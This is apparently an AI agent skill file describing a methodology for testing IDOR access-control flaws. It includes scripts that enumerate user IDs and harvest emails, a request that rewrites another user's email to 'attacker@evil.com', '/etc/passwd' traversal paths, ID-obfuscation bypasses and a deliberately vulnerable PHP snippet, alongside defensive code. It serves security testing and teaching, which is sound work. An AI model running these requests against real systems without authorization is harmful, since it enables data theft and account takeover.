---
name: idor-testing
Description: Expertise and methodology for IDOR unsafe direct object reference testing
version: 1.0.0
---

# IDOR unsafe direct object reference test

## Overview

IDOR (Insecure Direct Object Reference) is an access control vulnerability that occurs when an application directly uses user-supplied input to access a resource without verifying that the user has permission to access the resource. This skill provides methods for detecting, exploiting and protecting IDOR vulnerabilities.

## Vulnerability principle

The application uses predictable identifiers (such as IDs, file names) to directly reference resources without verifying that the current user has permission to access the resource.

**Dangerous code examples:**
```php
// Directly use the ID entered by the user
$file = file_get_contents('/files/' . $_GET['id'] . '.pdf');
```

## Test method

### 1. Identify direct object references

**Common resource types:**
-User ID
- File ID/File Name
- Order ID
- Document ID
- Account ID
- Record ID

**Common Locations:**
- URL parameters
- POST data
- Cookie value
- HTTP headers
- file path

### 2. Enumeration test

**Sequential ID Test:**
```
/user?id=1
/user?id=2
/user?id=3
```

**UUID test:**
```
/user?id=550e8400-e29b-41d4-a716-446655440000
/user?id=550e8400-e29b-41d4-a716-446655440001
```

**File name test:**
```
/files/document1.pdf
/files/document2.pdf
/files/invoice_2024_001.pdf
```

### 3. Horizontal permission test

**Access other user resources:**
```
Current user ID: 100
Test: /user?id=101
Test: /user?id=102
```

**Access other user files:**
```
/files/user100_document.pdf
Test: /files/user101_document.pdf
```

### 4. Vertical permission test

**Ordinary users access administrator resources:**
```
/admin/users?id=1
/admin/settings
/admin/logs
```

## Leverage technology

### User information leaked

**Enumerate user data:**
```bash
# Sequential enumeration
for i in {1..1000}; do
  curl "https://target.com/user?id=$i"
done

# Observe response differences
```

### File access

**Access other user files:**
```
/files/invoice_12345.pdf
/files/report_67890.pdf
/files/contract_11111.pdf
```

**Directory traversal combined with:**
```
/files/../admin/config.php
/files/../../etc/passwd
```

### Data modification

**Modify other user data:**
```http
POST /api/user/update
Content-Type: application/json

{
  "id": 101,
  "email": "attacker@evil.com"
}
```

### Batch operations

**Get data in batches:**
```python
import requests

for user_id in range(1, 1000):
    response = requests.get(f'https://target.com/api/user/{user_id}')
    if response.status_code == 200:
        print(f"User {user_id}: {response.json()}")
```

## Bypass technology

### ID obfuscation

**Base64 encoding:**
```
Original ID: 123
Coding: MTIz
URL: /user?id=MTIz
```

**Hash:**
```
Original ID: 123
Hash: 202cb962ac59075b964b07152d234b70
URL: /user?id=202cb962ac59075b964b07152d234b70
```

### Parameter name confusion

**Use different parameter names:**
```
/user?id=123
/user?uid=123
/user?user_id=123
/user?account=123
```

### HTTP method bypass

**Try different HTTP methods:**
```
GET /user/123
POST /user/123
PUT /user/123
PATCH /user/123
```

### Path confusion

**Try different paths:**
```
/api/v1/user/123
/api/user/123
/user/123
/users/123
```

## Tool usage

### Burp Suite

**Using Intruder:**
1. Interception request
2. Send to Intruder
3. Mark ID parameter
4. Use a number sequence or a custom list
5. Observe differences in responses

**Use Repeater:**
1. Manually modify the ID
2. Test different values
3. Observe the response

### OWASP ZAP

```bash
# Use ZAP for IDOR scanning
zap-cli active-scan --scanners all http://target.com
```

### Python script

```python
import requests
import json

def test_idor(base_url, user_id_range):
    for user_id in user_id_range:
        url = f"{base_url}/user?id={user_id}"
        response = requests.get(url)
        
        if response.status_code == 200:
            data = response.json()
            print(f"User {user_id}: {data.get('email', 'N/A')}")

test_idor("https://target.com", range(1, 100))
```

## Validation and reporting

### Verification steps

1. Confirm that unauthorized resources can be accessed
2. Verify that other user data can be read, modified, or deleted
3. Assess the impact (data leakage, privacy violation, etc.)
4. Record a complete POC

### Report Highlights

- Vulnerability location and resource identifier
- Accessible unauthorized resources
- Complete exploitation steps and PoC
- Fix suggestions (access control, resource mapping, etc.)

## Protective measures

### Recommended plan

1. **Access Control Verification**
   ```python
   def get_user_data(user_id, current_user_id):
# Verify permissions
       if user_id != current_user_id:
           raise PermissionDenied("Cannot access other user's data")
       
# Return data
       return db.get_user(user_id)
   ```

2. **Indirect object reference**
   ```python
# Use mapping table
   user_mapping = {
       'abc123': 100,
       'def456': 101,
       'ghi789': 102
   }
   
   def get_user(mapped_id):
       real_id = user_mapping.get(mapped_id)
       if not real_id:
           raise NotFound()
       return db.get_user(real_id)
   ```

3. **Role-based access control**
   ```python
   def check_permission(user, resource):
       if user.role == 'admin':
           return True
       if resource.owner_id == user.id:
           return True
       return False
   ```

4. **Resource Ownership Verification**
   ```python
   def update_user_data(user_id, data, current_user):
       user = db.get_user(user_id)
       
# Verify ownership
       if user.id != current_user.id and current_user.role != 'admin':
           raise PermissionDenied()
       
# Update data
       db.update_user(user_id, data)
   ```

5. **Use unpredictable identifiers**
   ```python
   import uuid
   
# Use UUID instead of sequential ID
   resource_id = str(uuid.uuid4())
   ```

6. **Principle of Least Privilege**
- Only return data that the user has permission to access
- Use data filtering
- Limit the scope of accessible resources

## Notes

- Only conducted in an authorized testing environment
- Avoid accessing or modifying real user data
- Pay attention to the differences in access control for different resources
- Pay attention to the request frequency when testing to avoid triggering protection